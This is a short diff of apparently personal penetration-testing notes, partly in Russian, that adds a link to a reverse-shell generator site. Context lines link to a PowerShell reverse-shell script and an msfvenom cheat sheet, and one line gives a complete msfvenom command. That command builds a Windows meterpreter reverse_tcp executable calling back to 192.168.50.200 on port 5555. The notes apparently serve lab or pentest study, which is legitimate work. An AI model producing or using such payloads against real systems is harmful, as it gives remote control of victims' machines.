@@ -40,6 +40,8 @@ https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.p
 
 https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
 
+https://www.revshells.com/
+
 c meterpreter сессией
 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f exe -o sh1.exe
